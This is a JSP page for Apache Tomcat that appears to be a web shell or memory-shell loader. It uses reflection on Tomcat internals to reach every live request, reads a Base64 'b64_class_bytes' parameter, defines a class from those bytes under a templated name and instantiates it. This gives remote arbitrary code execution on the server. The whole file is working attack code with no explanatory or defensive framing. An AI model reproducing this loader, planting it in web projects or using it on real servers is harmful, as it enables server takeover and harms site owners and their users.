<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardService" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.coyote.ProtocolHandler" %>
<%@ page import="org.apache.coyote.AbstractProtocol" %>
<%@ page import="org.apache.tomcat.util.net.AbstractEndpoint" %>
<%@ page import="org.apache.coyote.RequestGroupInfo" %>
<%@ page import="java.util.List" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.util.Base64" %>
<%
    WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

    Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
    context.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext)context.get(standardContext);

    Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
    service.setAccessible(true);
    StandardService standardService = (StandardService) service.get(applicationContext);

    Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
    connectorsField.setAccessible(true);
    Connector[] connectors = (Connector[])connectorsField.get(standardService);

    ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();

    Field handlerField = AbstractProtocol.class.getDeclaredField("handler");
    handlerField.setAccessible(true);
    AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);

    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
    globalField.setAccessible(true);
    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);

    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
    processors.setAccessible(true);
    List RequestInfolist = (List)processors.get(global);

    //因为不知道当前的访问对应哪一个 processor ，所以要遍历
    for(int i = 0; i < RequestInfolist.size(); i++){
        Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
        req.setAccessible(true);
        org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(RequestInfolist.get(i));
        Request request2 = (Request)request1.getNote(1);//获取catalina.connector.Request类型的Request

        String b64 = request2.getParameter("b64_class_bytes");

        try {
            byte[] b = Base64.getDecoder().decode(b64);
            String className = "%className%";
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
                String.class,
                byte[].class,
                int.class,
                int.class
            );
            defineClass.setAccessible(true);
            Class PwnerClass = (Class)defineClass.invoke(Thread.currentThread().getContextClassLoader(), className, b, 0, b.length);
            PwnerClass.newInstance();
        }catch (Exception e){
            e.printStackTrace();
        }
    }







%>
